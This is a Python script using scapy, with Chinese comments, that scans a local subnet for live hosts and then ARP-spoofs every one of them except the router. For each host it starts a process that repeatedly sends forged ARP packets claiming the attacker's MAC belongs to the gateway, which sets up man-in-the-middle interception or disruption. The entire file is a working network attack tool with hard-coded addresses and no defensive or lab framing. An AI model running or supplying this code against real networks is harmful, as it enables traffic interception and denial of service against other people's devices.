#!/usr/bin/python
# -*- coding: UTF-8 -*-
from scapy.all import *
import re
from scapy.layers.l2 import Ether, ARP
from multiprocessing import Process
import time


class ARP_Scan:
    instance = None
    wifi = "Killer(R) Wi-Fi 6 AX1650x 160MHz Wireless Network Adapter (200NGW)"
    route_ip = ""
    route_mac = "80:ea:07:62:72:d6"
    my_ip = ""
    my_mac = ""

    whiteList = []
    spoofList = []

    @classmethod
    def __new__(cls, *args, **kwargs):
        if cls.instance is None:
            cls.instance = super().__new__(cls)
        return cls.instance

    def __init__(self, target="192.168.0.0/24") -> None:
        """
        target='192.168.0.0/24' --设置目标参数
        """
        super().__init__()
        self.target = target
        self.result = []

    def send_Package(self, target):
        if re.match(r"\d+\.\d+\.\d+\.0/\d+", target) is not None:
            # 模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
            p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
            # ans表示收到的包的回复
            ans, unans = srp(p, iface=self.wifi, timeout=5)
            print("[*] 一共扫描到%d台主机：" % len(ans))

            # 将需要的IP地址和Mac地址存放在result列表中
            for s, r in ans:
                # 解析收到的包，提取出需要的IP地址和MAC地址
                self.result.append([r[ARP].psrc, r[ARP].hwsrc])
            # 将获取的信息进行排序
            self.result.sort()
        else:
            print("[E] 输入不合法")

    def print_Result(self):
        """
        * 打印出结果信息
        """
        # 打印出局域网中的主机
        for ip, mac in self.result:
            print("[*] IP: {} --- MAC: {}".format(ip, mac))

    @staticmethod
    def search_Interface():
        """
        打印网卡信息
        """
        print("YOUR Interfaces :")
        print(show_interfaces())

    def arpspoof(self):
        for ip, mac in self.result:
            if mac == scan.my_mac or ip in scan.whiteList or mac in self.spoofList:
                pass
            else:
                p = Process(target=process_run, args=(
                    self.route_ip, self.my_mac, ip, mac,))
                p.start()
                self.spoofList.append(mac)


def process_run(route_ip, my_mac, ip, mac):
    print("\n[==>>] attack {:} {:}".format(ip, mac))
    try:
        eth = Ether(src=my_mac, dst=mac)
        arp = ARP(
            # op="is-at",  # ARP响应
            op=1,
            hwsrc=my_mac,  # 网关mac
            psrc=route_ip,  # 网关IP
            hwdst=mac,  # 目标Mac
            pdst=ip  # 目标IP
        )
        # print((eth/arp).show())
        sendp(eth/arp, inter=2, loop=0.01)
    except Exception as f:
        print("\n[ERROR]  {:}-{:} : {:}".format(ip, mac, f))


if __name__ == "__main__":
    scan = ARP_Scan()
    scan.search_Interface()

    target = "192.168.0.0/24"
    interface = "Killer(R) Wi-Fi 6 AX1650x 160MHz Wireless Network Adapter (200NGW)"
    scan.my_ip = "192.168.0.244"
    scan.my_mac = "6a:5e:e1:13:a7:08"
    scan.route_ip = "192.168.0.1"
    scan.route_mac = "192.168.0.1"

    # 白名单
    scan.whiteList = []
    scan.whiteList.append(scan.route_ip)

    # 开始扫描
    if target is not None:
        scan.wifi = interface
        scan.target = target
        scan.send_Package(scan.target)
        scan.print_Result()
    else:
        print("[E] 请输入您要扫描的网段")
    # 开始arp_spoof
    scan.arpspoof()
    # time.sleep(10)
